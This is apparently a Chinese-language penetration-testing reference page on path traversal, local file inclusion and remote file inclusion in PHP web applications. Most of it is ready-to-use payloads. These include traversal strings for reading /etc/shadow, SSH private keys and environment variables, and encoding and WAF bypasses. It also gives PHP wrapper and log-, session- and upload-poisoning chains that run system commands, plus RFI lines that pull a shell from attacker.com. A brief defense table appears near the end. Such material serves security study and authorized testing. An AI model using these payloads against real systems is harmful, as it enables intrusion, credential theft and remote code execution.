---
attack_surface: [注入类, 配置缺陷, 文件操作]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - 操作系统文件系统基础
  - HTTP 协议基础
  - PHP/Java/.NET 基础（按目标技术栈）
difficulty: 中级
related_techniques:
  - ssrf-server-side-request-forgery
  - command-injection
  - ssti-server-side-template-injection
  - file-upload
  - log-poisoning
tools:
  - Burp Suite
  - ffuf / gobuster
  - dotdotpwn
  - LFISuite
  - Seclists (Fuzzing/LFI)
---

# 文件包含与路径遍历 — LFI / RFI / Path Traversal

> 关联文档：[SSRF](../SSRF/README.md) · [Command Injection](../Command%20Injection/README.md) · [SSTI](../SSTI/README.md) · [Open Redirect](../Open%20Redirect/README.md)

---

# 0x01 背景与原理

## 1.1 三种攻击辨析

| 攻击类型 | 本质 | 攻击结果 |
|---------|------|---------|
| **Path Traversal** | 操纵文件路径参数穿越目录结构 | 读取任意文件 (`/etc/passwd`) |
| **LFI (Local File Inclusion)** | 应用 `include()` 本地文件 | 代码执行、信息泄露 |
| **RFI (Remote File Inclusion)** | 应用 `include()` 远程文件 | 直接远程代码执行 |

**关键区别**：
- Path Traversal 影响 `fopen()`、`readfile()` 等**读操作函数**
- LFI/RFI 影响 `include()`、`require()` 等**代码包含函数**
- LFI 可通过文件内容控制升级为 RCE；RFI 直接就是 RCE

## 1.2 漏洞成因

```php
// 危险代码模式
$file = $_GET['page'];
include($file . '.php');       // 路径拼接
readfile('/var/www/files/' . $_GET['filename']);  // 目录拼接
```

---

# 0x02 Path Traversal — 路径遍历

## 2.1 基础遍历 Payload

```bash
# Unix/Linux
../../../etc/passwd
../../../../etc/passwd%00       # null byte 截断 (PHP < 5.3.4)
....//....//....//....//etc/passwd  # 递归过滤绕过

# Windows
..\..\..\windows\win.ini
../../windows/win.ini
....\/....\/....\/windows/win.ini
```

## 2.2 编码绕过技术矩阵

| 绕过技术 | Payload | 原理 |
|---------|---------|------|
| **URL 编码** | `%2e%2e%2f%2e%2e%2fetc/passwd` | 绕过 `../` 字符串过滤 |
| **双重 URL 编码** | `%252e%252e%252fetc/passwd` | WAF 解码一次，应用再解码一次 |
| **UTF-8 编码** | `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd` | 利用过宽 UTF-8 转换 |
| **Unicode 等价** | `..%ef%bc%8f..%ef%bc%8f` (全角 /) | Unicode 规范化绕过 |
| **16 位 Unicode** | `%u002e%u002e/` | 特定解析器差异 |

## 2.3 路径规范化绕过

```bash
# 前置路径锚定（当应用自动追加前缀路径时）
/var/www/images/../../../etc/passwd

# 路径分隔符替换
....//....//etc/passwd

# 反斜杠 (Windows)
..\..\windows\win.ini

# 组合利用
....\/....\/....\/etc/passwd
```

## 2.4 高危读取目标 (Linux)

```bash
/etc/passwd                    # 用户列表
/etc/shadow                    # 密码哈希 (需 root)
/etc/hosts                     # 主机名映射
/etc/apache2/sites-enabled/    # Apache 虚拟主机配置
/etc/nginx/sites-enabled/      # Nginx 配置
/proc/self/environ             # 环境变量 (可能含密钥)
/proc/self/fd/<n>              # 文件描述符 (日志、上传文件)
/proc/self/cmdline             # 进程命令行
/var/log/apache2/access.log    # Apache 访问日志
/var/log/nginx/access.log      # Nginx 访问日志
~/.ssh/id_rsa                  # SSH 私钥
~/.bash_history                # Bash 历史
```

## 2.5 高危读取目标 (Windows)

```bash
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\xampp\htdocs\wp-config.php
```

---

# 0x03 LFI — 本地文件包含

## 3.1 基础 LFI Payload

```php
# 读取源代码 (php://filter)
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/read=convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd

# 多层编码链
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=index

# 直接读取 (无 PHP 标签文件）
?page=/etc/passwd
?page=../../../../etc/passwd
```

## 3.2 PHP Wrapper 全集

| Wrapper | 用途 | Payload |
|---------|------|---------|
| `php://filter` | 读取/编码文件 | `php://filter/convert.base64-encode/resource=index` |
| `php://input` | POST body 作为 PHP 代码执行 | `?page=php://input` + POST `<?php system('id');?>` |
| `php://fd` | 读取文件描述符 | `php://fd/3` |
| `data://` | 内联数据作为代码 | `data://text/plain,<?php system('id');?>` |
| `data://` (base64) | base64 编码绕过 | `data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+` |
| `expect://` | 执行命令 (需 PECL 扩展) | `expect://id` |
| `phar://` | PHAR 反序列化 | `phar://uploaded.phar/shell.php` |
| `zip://` | ZIP 内脚本执行 | `zip://uploaded.zip%23shell.php` |
| `compress.zlib://` | 压缩流读取 | `compress.zlib://file.txt` |

## 3.3 LFI → RCE 升级路径

### 3.3.1 日志投毒

```bash
# Apache 访问日志投毒
GET /<?php system($_GET['cmd']);?> HTTP/1.1
# 然后用 LFI 包含
?page=/var/log/apache2/access.log&cmd=id

# 邮件日志投毒
MAIL FROM:<<?php system($_GET['cmd']);?>>
# 然后用 LFI 包含 /var/log/mail.log

# SSH 认证日志投毒 (auth.log)
ssh <?php system($_GET['cmd']);?>@target.com
# 包含 /var/log/auth.log
```

### 3.3.2 php://input (需 allow_url_include=On)

```http
POST /index.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>
```

### 3.3.3 data:// wrapper (需 allow_url_include=On)

```php
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

### 3.3.4 /proc/self/environ 投毒

```bash
# 在 User-Agent 中注入 PHP
GET /index.php?page=/proc/self/environ HTTP/1.1
User-Agent: <?php system('id');?>
```

### 3.3.5 文件上传 + LFI

```bash
# 上传图片马
echo '<?php system($_GET["cmd"]);?>' >> shell.gif
# 上传后包含
?page=uploads/shell.gif&cmd=whoami
```

### 3.3.6 Session 文件投毒

```php
# 1. 注册/登录时在用户名注入 PHP 代码
# 2. Session 文件位于 /tmp/sess_<session_id> 或 /var/lib/php/sessions/
# 3. 包含 session 文件
?page=/tmp/sess_<session_id>
```

---

# 0x04 RFI — 远程文件包含

## 4.1 基础 RFI

```php
# 前提: allow_url_include=On (PHP 5.2 默认 On，后续默认 Off)
?page=http://attacker.com/shell.php
?page=https://attacker.com/shell.txt
```

## 4.2 绕过 RFI URL 过滤

```bash
# 协议双重指定
?page=http:http://attacker.com/shell.php

# 大小写混淆
?page=hTTp://attacker.com/shell.php

# 不需要完整协议
?page=//attacker.com/shell.php
?page=\/\/attacker.com/shell.php

# Unicode 混淆
?page=http://attacker.com/shell.php
```

---

# 0x05 防御绕过技巧

## 5.1 后缀限制绕过

```bash
# Null byte 截断 (PHP < 5.3.4)
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.html

# 路径长度截断 (PHP < 5.2.8, 4096 字节)
?page=../../../etc/passwd/././././[...]

# 点号截断 (Windows)
?page=../../../windows/win.ini........
```

## 5.2 关键字过滤绕过

```bash
# "../" 替换为空（非递归过滤）
?page=....//....//....//etc/passwd

# ".." 阻止 → 绝对路径
?page=/etc/passwd

# "etc" 过滤 → 通配符 (proc)
?page=/proc/1/root/etc/passwd

# "php" 过滤 → 大写/编码
?page=data://text/plain,<?=system('id');?>
```

## 5.3 WAF 规避

```bash
# 多层编码
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 行分隔 Unicode
?page=..%c0%af..%c0%afetc%c0%afpasswd

# 换行符注入 (某些 WAF 行级检测)
/../../../etc/passwd%0a
```

---

# 0x06 漏洞挖掘流程

## 6.1 参数发现

```bash
# 搜集带有文件参数的 URL
echo "https://target.com" | waybackurls | grep -E "file=|page=|path=|doc=|include=|lang=|template="

# Fuzz 测试
ffuf -u "https://target.com/index.php?page=FUZZ" -w ~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
```

## 6.2 确认与验证

| 步骤 | 方法 | 确认信号 |
|------|------|---------|
| **1. 遍历探测** | `?file=../../../../etc/passwd` | 返回系统文件内容 |
| **2. Wrapper 探测** | `?file=php://filter/...` | Base64 编码内容返回 |
| **3. LFI 确认** | `?file=/etc/passwd` | 无 `../` 即读取 → 绝对路径 LFI |
| **4. RFI 确认** | `?file=http://collaborator.oastify.com` | DNS/HTTP pingback |

---

# 0x07 防御措施

| 层级 | 措施 |
|------|------|
| **输入验证** | 白名单文件名/路径，拒绝特殊字符 (`..`, `/`, `\`, `%00`) |
| **路径规范化** | `realpath()` / `basename()` 解析后与白名单对比 |
| **禁用危险 Wrapper** | `allow_url_include=Off`, `allow_url_fopen=Off` |
| **权限最小化** | Web 进程仅访问必要目录 (chroot / open_basedir) |
| **日志隔离** | Web 日志目录不可由 Web 进程读取 |

---

# 0x08 工具与参考

## 8.1 自动化工具

| 工具 | 功能 |
|------|------|
| **LFISuite** | LFI 自动利用 (wrapper 探测、shell 获取) |
| **dotdotpwn** | 路径遍历 Fuzzer |
| **ffuf** | 通用 Web Fuzzer (LFI wordlist) |
| **Burp Intruder** | 手动 payload 爆破 |

## 8.2 关键字典

- [SecLists Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings — Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

## 8.3 参考资料

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
- [HackTricks File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
